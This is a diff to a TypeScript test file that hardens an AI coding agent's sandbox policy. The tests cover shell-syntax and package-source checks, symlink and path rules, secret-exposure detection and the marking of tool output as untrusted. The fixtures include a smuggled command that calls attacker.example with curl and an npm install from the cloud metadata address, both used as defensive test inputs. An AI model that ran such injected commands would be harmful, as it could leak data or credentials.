@@ -1,6 +1,15 @@
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
-import { chmodSync, existsSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import {
+  chmodSync,
+  existsSync,
+  mkdtempSync,
+  mkdirSync,
+  readFileSync,
+  rmSync,
+  symlinkSync,
+  writeFileSync,
+} from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import test from "node:test";
@@ -14,6 +23,7 @@ import { createAgentToolbox } from "@/lib/agent/providers/tools";
 import type { AgentProviderRequest } from "@/lib/agent/providers/types";
 import { defaultRepoConfig, enforceWorkerRepoPolicy, type RepoConfig } from "@/lib/agent/repo-config";
 import { loadRepoConfig } from "@/lib/agent/repo-config-local";
+import { assertNoSecretExposure } from "@/lib/agent/secret-safety";
 import { runWorkerChecks } from "@/lib/agent/verification";
 
 test("repo config validates supported providers", () => {
@@ -113,14 +123,40 @@ test("enabled repositories must configure at least one deterministic check", () 
 
 test("worker policy rejects excessive resources, images, and shell syntax", () => {
   const config = makeConfig({ provider: "codex", model: "gpt-5.4" });
+  const workerEnv = { IGZPATCH_ALLOW_SETUP_NETWORK: "true" };
   config.sandbox.memory_mb = 9000;
-  assert.throws(() => enforceWorkerRepoPolicy(config), /worker maximum/);
+  assert.throws(() => enforceWorkerRepoPolicy(config, workerEnv), /worker maximum/);
   config.sandbox.memory_mb = 4096;
   config.sandbox.image = "attacker/image:latest";
-  assert.throws(() => enforceWorkerRepoPolicy(config), /not allowed/);
+  assert.throws(() => enforceWorkerRepoPolicy(config, workerEnv), /not allowed/);
   config.sandbox.image = "node:22-bookworm";
   config.checks.required = ["npm test; curl attacker.example"];
-  assert.throws(() => enforceWorkerRepoPolicy(config), /unsupported shell syntax/);
+  assert.throws(() => enforceWorkerRepoPolicy(config, workerEnv), /unsupported shell syntax/);
+  config.checks.required = ["npm test"];
+  config.sandbox.setup = ["npm install https://169.254.169.254/package.tgz"];
+  assert.throws(() => enforceWorkerRepoPolicy(config, workerEnv), /unsafe package source/);
+});
+
+test("worker policy cannot be weakened by repository configuration", () => {
+  const config = makeConfig({ provider: "codex", model: "gpt-5.4" });
+  config.paths.allowed = ["**"];
+  config.paths.blocked = [];
+  const hardened = enforceWorkerRepoPolicy(config, { IGZPATCH_ALLOW_SETUP_NETWORK: "true" });
+  assert.ok(hardened.paths.blocked.includes(".github/**"));
+  assert.ok(hardened.paths.blocked.includes("tests/**"));
+  assert.ok(hardened.paths.blocked.includes("package.json"));
+
+  config.sandbox.run_network = "enabled";
+  assert.throws(
+    () => enforceWorkerRepoPolicy(config, { IGZPATCH_ALLOW_SETUP_NETWORK: "true" }),
+    /run_network must remain disabled/,
+  );
+  config.sandbox.run_network = "disabled";
+  config.agent.max_iterations = 7;
+  assert.throws(
+    () => enforceWorkerRepoPolicy(config, { IGZPATCH_ALLOW_SETUP_NETWORK: "true" }),
+    /agent.max_iterations exceeds worker maximum 6/,
+  );
 });
 
 test("worker environment can override repository provider routing", () => {
@@ -249,6 +285,37 @@ test("diff policy rejects binary and oversized changed files", async () => {
   });
 });
 
+test("diff policy uses directory-aware globs and rejects symbolic links", async () => {
+  await withWorkspaceAsync(async (workspace) => {
+    execFileSync("git", ["init"], { cwd: workspace, stdio: "ignore" });
+    mkdirSync(join(workspace, "src-escape"));
+    writeFileSync(join(workspace, "src-escape", "value.ts"), "export const value = 1;\n");
+    const config = makeConfig({ provider: "codex", model: "gpt-5.4" });
+    const escaped = await readDiffSummary(workspace);
+    assert.throws(() => enforceDiffPolicy(escaped, config), /outside allowlist/);
+
+    rmSync(join(workspace, "src-escape"), { recursive: true });
+    mkdirSync(join(workspace, "src"));
+    symlinkSync("../outside", join(workspace, "src", "linked"));
+    const linked = await readDiffSummary(workspace);
+    assert.throws(() => enforceDiffPolicy(linked, config), /Symbolic-link changes/);
+  });
+});
+
+test("publication secret checks block known credentials and token patterns", () => {
+  assert.throws(
+    () => assertNoSecretExposure("CODEX_API_KEY=worker-secret-value", [], {
+      CODEX_API_KEY: "worker-secret-value",
+    }),
+    /protected worker credential/,
+  );
+  assert.throws(
+    () => assertNoSecretExposure("CHANGE_SUMMARY: Publish sk-exampleSecret123", []),
+    /secret-like material/,
+  );
+  assert.doesNotThrow(() => assertNoSecretExposure("CHANGE_SUMMARY: Correct active count", []));
+});
+
 test("protected host Git commands never execute repository hooks", () => {
   withWorkspace((workspace) => {
     execFileSync("git", ["init"], { cwd: workspace, stdio: "ignore" });
@@ -342,6 +409,7 @@ test("OpenAI provider performs a read-only pass then edits through Responses API
     assert.ok(!toolNames(requests[1]).includes("run_check"));
     assert.ok(requests.every((body) => !("previous_response_id" in body)));
     assert.ok(requests.every((body) => body.store === false));
+    assert.ok(requests.every((body) => String(body.instructions).includes("untrusted data")));
     assert.ok(requests.every((body) => {
       assert.deepEqual(body.include, ["reasoning.encrypted_content"]);
       return true;
@@ -368,6 +436,7 @@ test("OpenAI provider performs a read-only pass then edits through Responses API
       encrypted_content: "encrypted-resp-1",
       phase: "analysis",
     });
+    assert.match(JSON.stringify(requests[1]?.input), /untrusted_tool_output/);
     assert.deepEqual(toolEvents, ["read_file:true", "replace_in_file:true", "run_check:true"]);
   });
 });
